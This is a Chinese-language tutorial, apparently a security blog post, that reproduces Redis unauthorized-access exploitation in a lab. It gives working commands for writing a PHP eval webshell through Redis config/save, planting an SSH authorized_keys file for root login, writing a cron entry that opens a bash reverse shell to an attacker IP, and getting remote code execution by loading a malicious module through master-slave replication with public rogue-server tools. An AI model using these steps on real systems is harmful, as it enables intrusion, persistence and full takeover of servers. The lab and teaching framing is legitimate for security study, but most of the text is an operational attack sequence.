> 少就是多，慢就是快！

## 简介

REmote Dictionary（Redis）是一个由Salvatore Sanfilippo写的key-value存储系统

Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（list），集合（sets）和有序集合（sorted
sets）等类型。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。目前最新稳定版本为4.0.8。

Redis 是一个开源的高性能键值数据库。最热门的NoSql数据库之一，也被人们称为数据结构服务器。

它最突出的特点就是 快

    
    
    1. 以内存作为数据存储介质，读写数据的效率极高  
    2. 跟memcache 不同的是，储存在Redis中的数据是持久化的，断电或重启，数据也不会丢失  
    3. 存储分为内存存储。磁盘存储和log文件  
    4. 可以从磁盘重新将数据加载到内存中，也可以通过配置文件对其进行配置，因此redis才能实现持久化  
    5. 支持主从模式，可以配置集群，更利于支持大型项目

  1. Redis默认端口

Redis默认配置端口为6379，sentinel.conf配置器默认端口为26379

  2. 官方站点

<https://redis.io/>

4.x安装：

wget <http://download.redis.io/releases/redis-4.0.8.tar.gz>

tar -xvf redis -4.0.8.tar.gz

cd redis-4.0.8

make

最新版本前期漏洞已修复，测试时建议安装3.2.11版本

以下复现采用3.2版本复现

## Redis环境安装

  1. 定义

Redis是一个C语言编写的基于key-value类型的高效数据库

Redis可以执行一些操作将数据保存到内存中（这也是为什么效率这么高的原因）

同时redis也可以将内存中的数据写入磁盘中

  2. 未授权访问原因

主要是因为配置不当，导致未授权访问漏洞

进一步恶意数据写入内存或者磁盘之中，造成更大的危害

配置不当一般主要是两个原理：

    1. 配置登录策略导致任意机器都可以登录redis

    2. 未设置密码或者设置弱口令

  3. redis服务的搭建

wget <http://download.redis.io/release/redisa-3.2.0.tar.gz>

tar xzf redis-3.2.0-tar.gz

cd redis-3.2.0

make

![1](https://image.3001.net/images/20220110/1641775764_61db8294ad5c330304c70.png!small)

下载 redis 的压缩包，解压缩，切换目录到解压后的redis，进行编译

  4. 修改配置文件redis.conf

cp redis.conf ./src/redis.conf

复制配置文件

找到redis.conf文件，将 bind 127.0.0.1 注释掉

注释掉这行语句，代表任何机器都可以登录redis

![2](https://image.3001.net/images/20220110/1641775766_61db8296f40f6328174bd.png!small)

protected-mode设为no

代表关闭安全设置

![3](https://image.3001.net/images/20220110/1641775768_61db8298bbea372ba7c10.png!small)

启动redis-server

./src/redis-server redis.conf

src文件夹中都是redis 的命令

![4](https://image.3001.net/images/20220110/1641775770_61db829a70d00ee757b87.png!small)

![5](https://image.3001.net/images/20220110/1641775771_61db829bd6628b9cdf33f.png!small)

安装成功后，如图所示，并且服务和端口能够明显看到。默认配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件

  5. 添加环境变量

如果想要本地登录的话，可以设置一下环境变量，zsh需要添加环境变量

修改zsh的配置文件

vim ~/.zshrc

在文件末尾加入下面一行代码

export PATH=/root/Desktop/redis-3.2.0/src:$PATH

![6](https://image.3001.net/images/20220110/1641775772_61db829ced1d6989af9d6.png!small)

执行下面命令，按照新的配置运行

![7](https://image.3001.net/images/20220110/1641775773_61db829dcfa776f6dc586.png!small)

## Redis未授权访问

Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现了Redis未授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为

连接Redis服务器

  1. 交互式方式

redis-cli -h {host} -p {port}

以本方式连接，然后所有的操作都是在交互的方式实现，不需要再执行redis-cli了，例如命令：redis-cli -h 127.0.0.1-p
6379，加-a参数表示带密码的访问（默认没有密码）

  2. 命令方式

redis-cli -h {host} -p {port} {command}

redis-cli -h 192.168.27.187 -a qweasd

直接得到命令的返回结果

  3. 常见命令

查看信息：info

删除所有数据库的内容：flushall

刷新数据库：flushdb

看所有键：KEYS *，使用select num可以查看键值数据

设置变量：set test "who am i"

config set dir dirpath 设置路径等配置

config get dir/dbfilename 获取路径及数据配置信息

save 保存

get 变量，查看变量名称

详解参考：[redis cli命令 - milkty - 博客园
(cnblogs.com)](https://www.cnblogs.com/kongzhongqijing/p/6867960.html)

![8](https://image.3001.net/images/20220110/1641775774_61db829e9673fdcbf54b6.png!small)

使用攻击机测试是否存在未授权

redis-cli -h 192.168.27.187

info

![9](https://image.3001.net/images/20220110/1641775775_61db829fc8bbf89fe19e4.png!small)

不存在未授权情况

  1. bind 127.0.0.1 未注释，仅允许本地访问，攻击机kali无法连接

  2. 设置了密码（爆破redis的密码）

## Redis写webshell

  * 写入webshell

命令：

    
        config set dir /var/www/heml/  
    切换目录到网站的根目录  
    set x "\n\n\n<?php phpinfo();?>\n\n\n"  
    写入恶意代码到内存中（1）  
    set xx "\n\n\n<?php @eval($_POST['123']);?>\n\n\n"  
    写入恶意代码到内存中（2）  
    config set dbfilename shell.php  
    在磁盘中生成木马文件  
    save  
    将内存中的数据导出到磁盘文件

![10](https://image.3001.net/images/20220110/1641775776_61db82a0e995d0cd15bc8.png!small)

![11](https://image.3001.net/images/20220110/1641775777_61db82a1df716888ede51.png!small)

成功通过未授权写入webshell

  * 检查webshell

    1. kali开启apache

在终端输入“vim /etc/apache2/ports.conf” 进入编辑模式，修改apache2的默认监听端口号为8080，编辑好后保存

然后输入“/etc/init.d/apache2 start”

    2. 测试

![12](https://image.3001.net/images/20220110/1641775778_61db82a2c33d5a9f3ce52.png!small)

![13](https://image.3001.net/images/20220110/1641775779_61db82a38ae88ce406525.png!small)

![14](https://image.3001.net/images/20220110/1641775780_61db82a4ad9aa8a4b6181.png!small)

![15](https://image.3001.net/images/20220110/1641775782_61db82a628ae832204cbf.png!small)

蚁剑可以正常连接webshell

## Redis密钥登录SSH

  1. kali开启ssh服务
    
        /etc/init.d/ssh start

![16](https://image.3001.net/images/20220110/1641775783_61db82a73bdbc1a438d40.png!small)

  2. 修改redis密码

    
    
    config set reguirepass qweasd

登录：

    
    
    redis-cli -h 192.168.27.187 -a qweasd

![17](https://image.3001.net/images/20220110/1641775784_61db82a834457ce2f2fe1.png!small)

  3. 生成ssh-rsa密匙

    
    
    ssh-keygen -t rsa

![18](https://image.3001.net/images/20220110/1641775785_61db82a9202655c0108c4.png!small)

此处指定加密类型为rsa加密，要输入的地方不用管，直接回车即可，生成的两个文件可能处于目录下，也可能处于"/root/.ssh"目录下，取决于你当时有没有这个目录

  4. 写入ssh密匙

  5. 导出key（\n\n是为了防止乱码）

    
    
    （echo -e "\n\n"; cat qweasd.pub; echo -e "\n\n"） > key.txt

![19](https://image.3001.net/images/20220110/1641775786_61db82aae5a0b5d4dcda7.png!small)

将生成的公钥写入redis服务器的内存中

    
    
    cat key.txt | redis-cli -h 192.168.27.187 -a qweasd -x set xxx

![20](https://image.3001.net/images/20220110/1641775788_61db82ac34173c7515c11.png!small)

![21](https://image.3001.net/images/20220110/1641775789_61db82ad603dfba15aca6.png!small)

成功写入

设置路径，准备到处文件到磁盘。（本质是更改redis的备份路径）

    
    
    config set dir /root/.ssh

![22](https://image.3001.net/images/20220110/1641775790_61db82aeb8a36b51484d4.png!small)

注：如果这个“/root/.ssh”不存在的话会显示失败，不会返回OK，如第一次尝试，然后我去创建了该目录，成功返回OK

设置文件名（不能改成其他的）并导出

    
    
    config set dbfilename authorized_keys  
    save

![23](https://image.3001.net/images/20220110/1641775791_61db82af7e722b431ab48.png!small)

![24](https://image.3001.net/images/20220110/1641775793_61db82b10fcf80e5c61d3.png!small)

登录ssh

ssh -i qweasd root@192.168.27.187

![25](https://image.3001.net/images/20220110/1641775794_61db82b2c38c2968f01f2.png!small)

## 利用计划任务反弹shell

  1. 攻击端开启监听

    
    
    nc -vlp 6666

  2. 写入一句话

    
    
    192.168.175.162:6379> set xx "\n* * * * * bash -i >& /dev/tcp/192.168.175.161/9999 0>&1\n"   
    \#星号代表计划任务执行的时间   
    OK   
    192.168.175.162:6379> config set dir /var/spool/cron/   
    \#设置导出的路径   
    OK   
    192.168.175.162:6379> config set dbfilename root   
    \#设置导出的文件名   
    OK   
    192.168.175.162:6379> save   
    \#保存  
    OK   
    192.168.175.162:6379>   
    或者：  
    ┌──(root/kali)-[~/桌面/redis-3.2.0/src]   
    └─# echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.175.161/9999 0>&1\n\n"|./redis-cli -h 192.168.175.162 -a a001 -x set 1  
    ./redis-cli -h 192.168.175.162 -a a001 config set dir /var/spool/cron/  
    ./redis-cli -h 192.168.175.162 -a a001 config set dbfilename root   
    ./redis-cli -h 192.168.175.162 -a a001 save  
    OK  
    OK  
    OK   
    OK

![26](https://image.3001.net/images/20220110/1641775797_61db82b5427e0b0446f13.png!small)

## 利用主从复制RCE

未授权的redis会导致Getshell，可以说是众所周知的了。而这种方式是通过写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据。主要是利用了crontab、ssh
key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以说在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了。但随着现代的服务部署方式不断的发展，组件化成了不可逃避的大趋势，docker就是当下风潮的产物之一，而在这种部署下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，于是要尝试利用其他手段了

漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Redis4.x之后，通过外部扩展，可以实现在redis中实现一个新的Redis命令，构造恶意
.so 文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步到从机上。然后在机上加载恶意so文件，即可执行命令

简单讲就是：

攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上

下载安装一个4.0.8的版本

一样的配置 改bind+改no，然后启动

./src/redis-server redis.conf

设置密码

config set requirepass qweasd

注：

本次复现，攻击机ip为：192.168.27.180 被攻击机ip为：192.168.27.187

![27](https://image.3001.net/images/20220110/1641775798_61db82b6bcfac102e805b.png!small)

  1. 下载

git clone <https://github.com/n0b0dyCN/redis-rogue-server>

//未授权

git clone <https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server>

//有密码

由于github国内访问不太稳定，多拉几次就好了

![28](https://image.3001.net/images/20220110/1641775800_61db82b831394338b57c1.png!small)

目标靶机是不能开启保护模式，即下图设置才可以

  2. 帮助

![29](https://image.3001.net/images/20220110/1641775801_61db82b9a47d3a08f3ca6.png!small)

可看到exp执行方法

![30](https://image.3001.net/images/20220110/1641775803_61db82bb1d4375f7fb448.png!small)

这个工具是将攻击机变成redis主机，被攻击的redis变成redis从机，在主从交互时将构造好的恶意so文件传送上去并执行

  3. 使用工具进行攻击

（1） 正向shell

    
    
    python3 redis_rogue_server.py -rhost 192.168.27.180 -lhost 192.168.27.187 -passwd qwe123

![31](https://image.3001.net/images/20220110/1641775804_61db82bccfb1fac7fd80a.png!small)

箭头指向的地方会问你：拿shell 的方式，是直接拿shell（interactive交互）还是反弹shell（reverse反弹）

我们先试试直接拿shell，然后查询IP验证，成功

（2） 反弹shell

首先在攻击机上使用nc开启监听端口

![32](https://image.3001.net/images/20220110/1641775806_61db82be113dfac53277b.png!small)

然后再次执行使用工具的命令，选择r

![33](https://image.3001.net/images/20220110/1641775807_61db82bf2a55b2b457a12.png!small)

输入要反弹shell的ip以及监听的端口，下列命令是shell由什么都不显示 变为交互式的命令

    
    
    python3 -c "import pty;pty.spawn('/bin/bash')"

![34](https://image.3001.net/images/20220110/1641775808_61db82c0aa43daaccbee2.png!small)

成功获得交互shell

![35](https://image.3001.net/images/20220110/1641775810_61db82c2b4cc3332e77bf.png!small)

## 本地Redis主从复制RCE反弹shell

  1. 缺点

先讲一下上部分的脚本执行的原理。上述的原理是，目标机器的redis可以被远程其他的机器登录。然后执行脚本内写死的一些命令，利用这些命令我们就可以执行系统命令。问题来了，假如目标机器只允许本地进行登录的时候，上述利用直接暴毙。这个时候，我们可以通过配合其他漏洞，从目标本地登录redis。然后手动执行脚本内写死的一些命令

将靶机Redis作为从机，将攻击机器设置为主机，然后攻击机器会自动将一些恶意so文件同步给目标机器

从而实现对目标机器的远程命令执行

  2. 下载

<https://github.com/n0b0dyCN/redis-rogue-server>

//未授权

<https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server>

//有密码

将redis-rogue-server的exp.so文件复制到Awsome文件夹中使用，因为exp.so带system模块

  3. 执行演示

（1） kali开启监听

    
    
    nc -lvp 9999

新开一个窗口，来接收会话的反弹

![36](https://image.3001.net/images/20220110/1641775812_61db82c49d702a8e8a6d9.png!small)

（2） 开启主服务器

    
    
    python3 redis_rogue_server.py -v -path exp.so

![37](https://image.3001.net/images/20220110/1641775813_61db82c56cb1ee9d8f5f0.png!small)

开启15000端口的主服务器

（3） Redis主从同步

查看是否存在模块

    
    
    module list

![38](https://image.3001.net/images/20220110/1641775814_61db82c62f7bc353d5814.png!small)

可看到目前没有可用的模块

主从同步：

![39](https://image.3001.net/images/20220110/1641775815_61db82c74d9b139a1cb5b.png!small)

    
    
    config set dir /tmp  
    //一般tmp目录都有写权限，所以选择这个目录写入  
    config set dbfilename exp.so  
    //设置导出文件的名字  
    slaveof 192.168.27.187 15000  
    //进行主从同步，将恶意so文件写入到tmp文件  
    //端口可以自定义

同步规则：

![40](https://image.3001.net/images/20220110/1641775818_61db82ca1c8b50646f488.png!small)

可看到主服务器上FULLRESYNC全局同步数据中！将恶意的exp.so同步到redis服务器上

    
    
    执行恶意模块：  
    module load ./exp.so  
    //加载写入的恶意so文件模块  
    module list  
    //查看恶意so有没有加载成功，主要是有没有“system”

![41](https://image.3001.net/images/20220110/1641775823_61db82cf2ade51f2993ba.png!small)

可以看到加载成功

（4） 反弹shell

    
    
    system.rev 192.168.27.187 9999

![42](https://image.3001.net/images/20220110/1641775824_61db82d02cda068b11e23.png!small)

成功获得反弹shell并交互

（5） 另一种方式

    
    
    system.exec "id"

当然可以通过这种方式来直接执行系统命令

（6） 关闭主从同步

    
    
    slaveof NO ONE  
    // 关闭主从

本地redis服务器关闭，或者直接在主服务器关闭也行

## 知识拓展

  1. RESF协议

定义：

redis客户端与服务端通信，使用RESP（REdis Serialization
Protocal,redis序列化协议）协议通信，该协议是专门为redis设计的通信协议，但也可以用于其它客户端-服务器通信的场景。RESP可以用于序列化不同的数据类型

如：整型、字符型、数组…并且为错误提供专门的类型；客户端发送请求时，以字符串数组的作为待执行命令的参数。redis服务器根据不同的命令返回不同的数据类型。

支持协议：

RESF协议支持五种数据类型：

简单字符串、错误数据、整数、批量字符串、数组

*3，代表数组的长度为3

$4，代表字符串的长度为4

0d0a即\r\n表示结束符

+0K表示服务端执行成功后返回的字符串

  2. Gopher协议

定义：

在http出现之前，访问网页需要输入的是”gopher://gopher.baidu.com“而不是现在的”<https://www.baidu.com>“，而它被替代的一方面原因是收费，另一方面的原因是它固化的结构没有HTML网页灵活。gopher协议支持GET&POST请求，常用于攻击内网ftp、redis、telnet、smtp等服务，还可以利用gopher协议访问redis反弹shell

gopher语句生成工具：

<https://github.com/tarunkant/Gopherus>

